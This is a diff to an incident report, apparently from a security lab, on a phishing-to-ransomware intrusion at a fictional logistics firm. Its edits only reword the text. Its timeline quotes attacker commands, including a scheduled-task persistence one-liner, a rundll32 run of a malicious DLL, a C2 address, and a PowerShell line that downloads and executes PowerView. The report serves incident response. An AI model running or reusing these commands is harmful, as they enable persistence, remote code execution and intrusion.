@@ -9,13 +9,13 @@
 
 On Aug 29, 2023 @ 20:51:15.856, Evan Hutchinson, CEO, opened up a malicious attachment frmo a phishing email from a compromised user account of Allie Sierra. This caused attachment contained malicious commands, where the attacker was able to execute files, create a command and control connection, and create scheduled tasks. With the C2 connection, the attacker was able to enumerate user accounts, computer objects, and files. Along with this, the attacker downloaded exploitation software `mimikatz` to dump account credentials, perform lateral movement, and exfiltrate a file. Finally, the attacker downloaded and executed ransomwware.
 
-At this point, the security team is in progress to revert the system and files back to a working state and rotate account credentials.
+At this point, the security team is in progress to revert the system and files back to a working state, rotate account credentials, and block adversaries.
 
 ---
 
 ## TL;DR
 
-A phishing email sent by a compromised account of Allie Sierra (`allie.sierra@quicklogistics.org`), to Evan Hutchinson (`evan.hutchinson`), CEO of the company. Evan clicked on a malicious attachment `ProjectFinancialSummary_Q3.pdf.hta`. The attacker established persistance by created scheduled tasks and initiating a C2 connection (`165.232.170.151:80`). The attacker also bypassed UAC and dumped credentials by downloading and using `mimikatz`. The attacker then performed lateral movement by using pass-the-hash attack, to various accounts such as `itadmin`, `allan.smith`, and `Administrator`. Finally, the attacker downloaded and executed a `ransomboogey.exe` ransomware file. Security is working to revert system back to its original state and rotate account credentails.
+A phishing email sent by a compromised account of Allie Sierra (`allie.sierra@quicklogistics.org`), to Evan Hutchinson (`evan.hutchinson`), CEO of the company. Evan clicked on a malicious attachment `ProjectFinancialSummary_Q3.pdf.hta`. The attacker established persistance by created scheduled tasks and initiating a C2 connection (`165.232.170.151:80`). The attacker also bypassed UAC and dumped credentials by downloading and using `mimikatz`. The attacker then performed lateral movement by using pass-the-hash attack, to various accounts such as `itadmin`, `allan.smith`, and `Administrator`. Finally, the attacker downloaded and executed a `ransomboogey.exe` ransomware file. Security is working to revert system back to its original state, rotate account credentails, and block IOCs.
 
 ---
 
@@ -30,8 +30,8 @@ A phishing email sent by a compromised account of Allie Sierra (`allie.sierra@qu
 ## Scope & Impact
 
 - **Systems impacted:** `WKSTN-0051.quicklogistics.org`, `WKSTN-1327.quicklogistics.org`, `DC01.quicklogistics.org`
-- **Data / risk:** Persistence through scheduled task, C2 connection, exfiltration of user accounts names, LSASS secrets (plaintext passwords, NTLM hashes, Kerberos tickets and cached credentials from LSASS memory), `allan.smith`'s password, password hashes (`itadmin`, `administrator`, `backupda`), ransomware risk.
-- **Business impact:** Major - Credentials of high power roles were exploited, ransomware executed.
+- **Data / risk:** Persistence through scheduled task, C2 connection, exfiltration of user accounts names, LSASS secrets from LSASS memory, `allan.smith`'s password, password hashes (`itadmin`, `administrator`, `backupda`), ransomware risk.
+- **Business impact:** Major - Credentials of high-profile roles were exploited and ransomware executed.
 
 ---
 
@@ -44,7 +44,7 @@ A phishing email sent by a compromised account of Allie Sierra (`allie.sierra@qu
 | Aug 29, 2023 @ 23:51:16.738 | `evan.hutchinson` | Stage 1 payload implants a file to another location | `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat` |
 | Aug 29, 2023 @ 23:51:16.771 | `evan.hutchinson` | `review.dat` file gets executed | `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer` |
 | Aug 29, 2023 @ 23:51:16.809 | `evan.hutchinson` | Stage 1 payload establishes a persistence mechanism by creating scheduled task | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;` |
-| Aug 29, 2023 @ 23:51:17.910 | `evan.hutchinson` | C2 connection established to `165.232.170.151:80` | - |
+| Aug 29, 2023 @ 23:51:17.910 | `evan.hutchinson` | C2 connection established to `165.232.170.151:80` by `review.dat` | - |
 | Aug 29, 2023 @ 23:53:47.951 | `evan.hutchinson` | attacker performs enumeration commands | `whoami` |
 | Aug 29, 2023 @ 23:54:49.043 | `evan.hutchinson` | Attacker bypasses UAC | `fodhelper.exe` |
 | Aug 30, 2023 @ 00:06:38.162 | `evan.hutchinson` | Attacker downloads enumeration tool and performs enumeration of domain computer objects | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainComputer"` |
@@ -132,7 +132,7 @@ A phishing email sent by a compromised account of Allie Sierra (`allie.sierra@qu
   | [`T1548.002`](https://attack.mitre.org/techniques/T1548/002/) | Abuse Elevation Control Mechanism: Bypass User Account Control | Adversary used `fodhelper.exe` |
   | [`T1486`](https://attack.mitre.org/techniques/T1486/) | Data Encrypted for Impact | Adversary used `ransomboogey.exe` to encrypt data |
 
-- **Summary conclusion:** (attacker behavior + final assessment) Attacker gained access to `WKSTN-0051.quicklogistics.org` by spearphishing email to Evan Hutchinson. Attacker was able to set up a C2 connection, download malware, dump credentials, and move laterally. Attacker finally downloaded and executed a ransomware file. The extent of the ransomware is currently unknown.
+- **Summary conclusion:** Attacker gained access to `WKSTN-0051.quicklogistics.org` by spearphishing email to Evan Hutchinson. Attacker was able to set up a C2 connection, download malware, dump credentials, and move laterally. Attacker finally downloaded and executed a ransomware file. The extent of the ransomware is currently unknown.
 
 ---
 
